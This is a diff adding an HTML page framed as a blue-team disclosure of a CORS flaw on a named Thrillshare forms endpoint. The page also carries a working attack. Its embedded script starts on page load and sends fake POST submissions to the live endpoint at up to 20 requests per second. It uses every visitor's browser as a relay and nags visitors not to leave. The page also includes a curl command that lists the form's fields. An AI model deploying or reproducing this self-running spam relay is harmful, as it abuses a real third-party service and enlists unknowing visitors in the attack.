@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration Exploit Demo — Thrillshare Form Spam Relay | Blue Team Research</title>
+    <style>
+        :root {
+            --bg: #0a0e14;
+            --surface: #131820;
+            --surface2: #1a1f2b;
+            --border: #252b36;
+            --text: #c8ccd4;
+            --text-muted: #7b8290;
+            --accent: #ff6b6b;
+            --accent2: #ff4444;
+            --green: #00e676;
+            --yellow: #ffd740;
+            --blue: #40c4ff;
+            --purple: #b388ff;
+            --font-mono: 'SF Mono', 'Cascadia Code', 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            --font-sans: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            --radius: 8px;
+            --radius-lg: 14px;
+            --shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
+            --glow-red: 0 0 24px rgba(255, 107, 107, 0.3);
+            --glow-green: 0 0 24px rgba(0, 230, 118, 0.25);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-sans);
+            line-height: 1.7;
+            min-height: 100vh;
+            background-image:
+                radial-gradient(ellipse at 30% 20%, rgba(255, 107, 107, 0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 60%, rgba(64, 196, 255, 0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 80%, rgba(179, 136, 255, 0.03) 0%, transparent 50%);
+        }
+
+        .navbar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.4);
+        }
+        .navbar .logo {
+            font-family: var(--font-mono);
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .navbar .logo .shield {
+            font-size: 1.5rem;
+        }
+        .navbar .badge {
+            background: var(--accent);
+            color: #000;
+            font-size: 0.65rem;
+            font-weight: 800;
+            padding: 4px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            animation: pulse-badge 2s ease-in-out infinite;
+        }
+        @keyframes pulse-badge {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.65; }
+        }
+
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 28px 20px 60px;
+        }
+
+        .blog-header {
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+        .blog-header .category {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--accent);
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .blog-header h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.25;
+            margin-bottom: 10px;
+            letter-spacing: -0.02em;
+        }
+        .blog-header .meta {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            align-items: center;
+        }
+        .blog-header .meta span {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .severity-tag {
+            display: inline-block;
+            background: #ff444422;
+            color: var(--accent);
+            border: 1px solid var(--accent2);
+            font-weight: 700;
+            font-size: 0.75rem;
+            padding: 3px 10px;
+            border-radius: 4px;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 24px 28px;
+            margin-bottom: 22px;
+            box-shadow: var(--shadow);
+        }
+        .card h2 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card h3 {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #e0e0e0;
+            margin: 16px 0 8px;
+        }
+        .card p {
+            margin-bottom: 10px;
+            color: var(--text);
+        }
+        .card ul, .card ol {
+            margin-left: 20px;
+            margin-bottom: 10px;
+            color: var(--text);
+        }
+        .card li {
+            margin-bottom: 5px;
+        }
+        .card code {
+            background: #0d1117;
+            color: var(--blue);
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.88em;
+        }
+        .card pre {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 16px 18px;
+            overflow-x: auto;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            line-height: 1.5;
+            color: #c8ccd4;
+            margin: 10px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .card pre .key { color: var(--blue); }
+        .card pre .val { color: var(--green); }
+        .card pre .comment { color: #5c6370; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 14px;
+            margin: 16px 0;
+        }
+        .stat-box {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 16px 18px;
+            text-align: center;
+            transition: all 0.25s;
+        }
+        .stat-box:hover {
+            border-color: var(--accent);
+            box-shadow: var(--glow-red);
+        }
+        .stat-box .stat-value {
+            font-family: var(--font-mono);
+            font-size: 2rem;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1;
+        }
+        .stat-box .stat-label {
+            font-size: 0.72rem;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        .stat-box.success .stat-value { color: var(--green); }
+        .stat-box.fail .stat-value { color: var(--accent); }
+        .stat-box.rate .stat-value { color: var(--yellow); }
+        .stat-box.total .stat-value { color: var(--blue); }
+
+        .speed-slider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            font-family: var(--font-mono);
+            margin: 16px 0;
+            justify-content: center;
+        }
+        .speed-slider input[type="range"] {
+            width: 200px;
+            accent-color: var(--accent);
+            cursor: pointer;
+        }
+        .speed-slider .speed-val {
+            color: #fff;
+            font-weight: 700;
+            min-width: 65px;
+            text-align: center;
+        }
+
+        .log-container {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            max-height: 380px;
+            overflow-y: auto;
+            padding: 12px 16px;
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            line-height: 1.6;
+            margin-top: 10px;
+        }
+        .log-container .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid #1a1f2b;
+            animation: fadeInLog 0.2s ease;
+        }
+        @keyframes fadeInLog {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .log-entry .ts { color: #5c6370; margin-right: 8px; }
+        .log-entry .status-ok { color: var(--green); font-weight: 700; }
+        .log-entry .status-err { color: var(--accent); font-weight: 700; }
+        .log-entry .id-highlight { color: var(--yellow); }
+        .log-entry .info-highlight { color: var(--blue); }
+
+        .highlight-box {
+            background: #1a0a0a;
+            border: 1px solid #ff444433;
+            border-radius: var(--radius);
+            padding: 16px 20px;
+            margin: 14px 0;
+            color: #ffaaaa;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .highlight-box .icon { font-size: 1.4rem; flex-shrink: 0; }
+
+        .progress-bar-outer {
+            background: #1a1f2b;
+            border-radius: 20px;
+            height: 8px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-bar-inner {
+            height: 100%;
+            border-radius: 20px;
+            background: linear-gradient(90deg, var(--accent2), var(--accent), #ff8a65);
+            transition: width 0.3s;
+            width: 0%;
+        }
+
+        .log-container::-webkit-scrollbar { width: 6px; }
+        .log-container::-webkit-scrollbar-track { background: #0d1117; }
+        .log-container::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+
+        @media (max-width: 640px) {
+            .blog-header h1 { font-size: 1.5rem; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+            .stat-box .stat-value { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo">
+            <span class="shield">🛡️</span> BlueTeamResearch
+        </div>
+        <div class="badge">🔴 HARDCODED PoC – AUTO‑SPAMMING</div>
+    </nav>
+
+    <div class="container">
+
+        <div class="blog-header">
+            <div class="category">🔍 Vulnerability Research & Disclosure</div>
+            <h1>CORS Misconfiguration + Public Enumeration = Fully Automated Form Spam Relay</h1>
+            <div class="meta">
+                <span>📅 2026-07-29</span>
+                <span>✍️ Blue Team Researcher</span>
+                <span class="severity-tag">🔴 CRITICAL</span>
+                <span>🕐 ~8 min read</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>📋 Executive Summary</h2>
+            <p>
+                A <code>forms.services.thrillshare.com</code> endpoint exhibits three compounding flaws:
+                <strong>permissive CORS</strong> (<code>Access-Control-Allow-Origin: *</code>),
+                <strong>missing authentication on POST</strong>, and a
+                <strong>publicly accessible form structure endpoint</strong>.
+                Together they allow an attacker to enumerate every required field and then spam the form from any origin.
+            </p>
+            <div class="highlight-box">
+                <span class="icon">⚠️</span>
+                <span><strong>Impact:</strong> A single HTML file (hosted on GitHub Pages, Neocities, etc.) can auto‑submit unlimited fake entries at 1–20 req/s using the visitor's browser as a relay.</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🔬 Core Vulnerabilities</h2>
+            <h3>1. CORS Wildcard on State‑Changing Endpoint</h3>
+            <pre>access-control-allow-origin: *<br>access-control-allow-methods: GET, POST, OPTIONS, PUT, PATCH, DELETE</pre>
+            <p>Any website can make cross‑origin AJAX requests. The Same‑Origin Policy is effectively disabled.</p>
+
+            <h3>2. Unauthenticated POST Acceptance</h3>
+            <pre><span class="comment">// No token, no CAPTCHA, no CSRF protection</span>
+        POST /api/v1/forms/eb94f34b.../responses
+        → 201 Created with a new response ID</pre>
+            <p>Submissions are accepted without any authentication or rate limiting.</p>
+
+            <h3>3. Public Form Element Enumeration (BONUS)</h3>
+            <p>
+                The endpoint <code>/api/v1/forms/9353/elements?include=element_choices...</code>
+                returns the complete form schema (element IDs, types, and choice IDs) <em>without any authentication</em>.
+                This allows an attacker to dynamically build perfectly valid payloads without any prior knowledge.
+            </p>
+            <pre>curl -X GET "https://forms.services.thrillshare.com/api/v1/forms/9353/elements?include=element_choices&secondary_organization_id=14296"</pre>
+            <p>
+                The live demo below uses a <strong>hardcoded payload</strong> (already verified) to avoid reliance on that endpoint,
+                but the enumeration risk is equally critical.
+            </p>
+        </div>
+
+        <div class="card" style="border-left: 3px solid var(--accent2);">
+            <h2>⚡ Live Demonstration (Hardcoded Payload, Auto‑Spam @ 1 req/s)</h2>
+            <p style="color:var(--yellow);font-weight:600;">
+                🟡 This page is <strong>actively spamming the endpoint from an external origin</strong> using the exact
+                hardcoded fields from the original curl test. It started automatically when you loaded the page.
+                All submissions are clearly marked as test data.
+            </p>
+
+            <div class="stats-grid">
+                <div class="stat-box total">
+                    <div class="stat-value" id="statTotal">0</div>
+                    <div class="stat-label">Total Requests</div>
+                </div>
+                <div class="stat-box success">
+                    <div class="stat-value" id="statSuccess">0</div>
+                    <div class="stat-label">✅ Successful (201)</div>
+                </div>
+                <div class="stat-box fail">
+                    <div class="stat-value" id="statFail">0</div>
+                    <div class="stat-label">❌ Failed</div>
+                </div>
+                <div class="stat-box rate">
+                    <div class="stat-value" id="statRate">0</div>
+                    <div class="stat-label">Requests/sec</div>
+                </div>
+            </div>
+            <div class="progress-bar-outer">
+                <div class="progress-bar-inner" id="progressBar"></div>
+            </div>
+
+            <div class="speed-slider">
+                <span>🐢</span>
+                <input type="range" id="speedSlider" min="1" max="20" value="1" step="1">
+                <span>🐇</span>
+                <span class="speed-val" id="speedLabel">1 req/s</span>
+            </div>
+
+            <h3 style="margin-top:16px;">📜 Real‑Time Request Log</h3>
+            <div class="log-container" id="logContainer">
+                <div class="log-entry" style="color:#5c6370;">⏳ Spam started automatically…</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🛠️ Required Remediation</h2>
+            <ol>
+                <li><strong>Restrict CORS origins</strong> – replace <code>*</code> with the exact trusted domain.</li>
+                <li><strong>Add server‑side CAPTCHA validation</strong> (reCAPTCHA v3 + backend verification).</li>
+                <li><strong>Implement IP‑based rate limiting</strong> (e.g., 5 submissions per hour, return 429).</li>
+                <li><strong>Protect the elements endpoint</strong> – it must not disclose form structure without authentication.</li>
+            </ol>
+        </div>
+
+        <div style="text-align:center;color:var(--text-muted);font-size:0.78rem;padding:20px 0;">
+            <p>🛡️ Blue Team Research — Responsible Disclosure Demo — 2026-07-29</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const TARGET_URL = 'https://forms.services.thrillshare.com/api/v1/forms/eb94f34b-81e2-4c52-ba73-8fe198128e55/responses';
+
+            // State
+            let isSpamming = true; // auto-start
+            let totalSent = 0;
+            let totalSuccess = 0;
+            let totalFail = 0;
+            let requestsPerSecond = 1;
+            let spamInterval = null;
+            let lastSecondCount = 0;
+            let lastSecondTimestamp = Date.now();
+            let currentRPS = 0;
+            let activeRequests = 0;
+            const MAX_CONCURRENT = 10;
+
+            // Hardcoded payload components (exactly matching the original successful curl)
+            const HARDCODED_CHOICE_IDS = ['96110', '96111', '96112', '96113', '96114', '96115'];
+
+            function buildHardcodedFormData() {
+                const fd = new FormData();
+                // 77661 - First Name
+                fd.append('data[attributes][answers][][element_id]', '77661');
+                fd.append('data[attributes][answers][][answer_text]', 'HARDCODED-POC');
+                // 77662 - Last Name
+                fd.append('data[attributes][answers][][element_id]', '77662');
+                fd.append('data[attributes][answers][][answer_text]', 'DEMO-' + Date.now().toString(36).toUpperCase());
+                // 77663 - Single choice
+                fd.append('data[attributes][answers][][element_id]', '77663');
+                fd.append('data[attributes][answers][][element_choice_id]', '96108');
+                // 77664 - Email
+                fd.append('data[attributes][answers][][element_id]', '77664');
+                fd.append('data[attributes][answers][][answer_text]', 'hardcoded.poc@test.local');
+                // 77665 - Phone
+                fd.append('data[attributes][answers][][element_id]', '77665');
+                fd.append('data[attributes][answers][][answer_text]', '000-000-0000');
+                // 77666 - Multi-select (6 choices)
+                HARDCODED_CHOICE_IDS.forEach(cid => {
+                    fd.append('data[attributes][answers][][element_id]', '77666');
+                    fd.append('data[attributes][answers][][element_choice_id]', cid);
+                });
+                // 77667 - Text area
+                fd.append('data[attributes][answers][][element_id]', '77667');
+                fd.append('data[attributes][answers][][answer_text]', 'BLUE-TEAM-POC-' + Date.now().toString(36).toUpperCase());
+                // viewed_at
+                fd.append('data[attributes][viewed_at]', new Date().toISOString());
+                return fd;
+            }
+
+            // DOM refs
+            const statTotal = document.getElementById('statTotal');
+            const statSuccess = document.getElementById('statSuccess');
+            const statFail = document.getElementById('statFail');
+            const statRate = document.getElementById('statRate');
+            const progressBar = document.getElementById('progressBar');
+            const logContainer = document.getElementById('logContainer');
+            const speedSlider = document.getElementById('speedSlider');
+            const speedLabel = document.getElementById('speedLabel');
+
+            function addLogEntry(type, message, responseId) {
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                const now = new Date();
+                const ts = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');
+                const statusClass = type === 'success' ? 'status-ok' : (type === 'info' ? 'info-highlight' : 'status-err');
+                const statusText = type === 'success' ? '✓ 201' : (type === 'info' ? 'ℹ INFO' : '✗ ERR');
+                let idHtml = responseId ? ` <span class="id-highlight">[ID: ${responseId}]</span>` : '';
+                entry.innerHTML = `<span class="ts">[${ts}]</span> <span class="${statusClass}">${statusText}</span>${idHtml} — ${message}`;
+                logContainer.appendChild(entry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+                while (logContainer.children.length > 200) logContainer.removeChild(logContainer.firstChild);
+            }
+
+            function updateStats() {
+                statTotal.textContent = totalSent;
+                statSuccess.textContent = totalSuccess;
+                statFail.textContent = totalFail;
+                statRate.textContent = currentRPS;
+                const pct = Math.min(100, (totalSent / 100) * 100);
+                progressBar.style.width = pct + '%';
+            }
+
+            function sendOneRequest() {
+                if (!isSpamming) return;
+                totalSent++;
+                activeRequests++;
+                updateStats();
+
+                const fd = buildHardcodedFormData();
+                const startTime = performance.now();
+
+                fetch(TARGET_URL, {
+                    method: 'POST',
+                    headers: { 'Accept': 'application/json' },
+                    body: fd
+                })
+                .then(response => response.json())
+                .then(data => {
+                    activeRequests--;
+                    const elapsed = Math.round(performance.now() - startTime);
+                    if (data.data && data.data.id) {
+                        totalSuccess++;
+                        addLogEntry('success', `Created in ${elapsed}ms`, data.data.id);
+                    } else if (data.errors) {
+                        totalFail++;
+                        const errMsg = Array.isArray(data.errors) ? data.errors.map(e => e.title || JSON.stringify(e)).join('; ') : JSON.stringify(data.errors);
+                        addLogEntry('error', `Validation: ${errMsg.substring(0, 120)}`, null);
+                    } else {
+                        totalFail++;
+                        addLogEntry('error', `Unexpected response`, null);
+                    }
+                    updateStats();
+                })
+                .catch(error => {
+                    activeRequests--;
+                    totalFail++;
+                    addLogEntry('error', `Network: ${error.message}`, null);
+                    updateStats();
+                });
+            }
+
+            function updateRPS() {
+                const now = Date.now();
+                const elapsed = (now - lastSecondTimestamp) / 1000;
+                if (elapsed >= 1.0) {
+                    const sentInWindow = totalSent - lastSecondCount;
+                    currentRPS = Math.round(sentInWindow / elapsed);
+                    lastSecondCount = totalSent;
+                    lastSecondTimestamp = now;
+                    updateStats();
+                }
+            }
+
+            function spamLoop() {
+                if (!isSpamming) return;
+                const toSend = Math.min(requestsPerSecond, MAX_CONCURRENT - activeRequests);
+                for (let i = 0; i < toSend; i++) {
+                    if (!isSpamming) break;
+                    sendOneRequest();
+                }
+                updateRPS();
+            }
+
+            // Speed slider listener
+            speedSlider.addEventListener('input', function() {
+                requestsPerSecond = parseInt(this.value);
+                speedLabel.textContent = requestsPerSecond + ' req/s';
+                lastSecondCount = totalSent;
+                lastSecondTimestamp = Date.now();
+            });
+
+            // Auto-start
+            addLogEntry('info', `🚀 Auto-spamming started at 1 req/s with hardcoded payload from ${window.location.hostname}`, null);
+            spamLoop();
+            spamInterval = setInterval(spamLoop, 1000);
+
+            // Periodic RPS update
+            setInterval(() => {
+                if (isSpamming) updateRPS();
+            }, 1000);
+
+            window.addEventListener('beforeunload', function(e) {
+                if (totalSent > 5) {
+                    e.preventDefault();
+                    e.returnValue = 'Spam demo is still running. Leave?';
+                    return e.returnValue;
+                }
+            });
+
+            console.log('%c🛡️ Hardcoded CORS PoC – Auto-spamming now', 'color:#ff6b6b;font-size:16px;');
+        })();
+    </script>
+</body>
+</html>
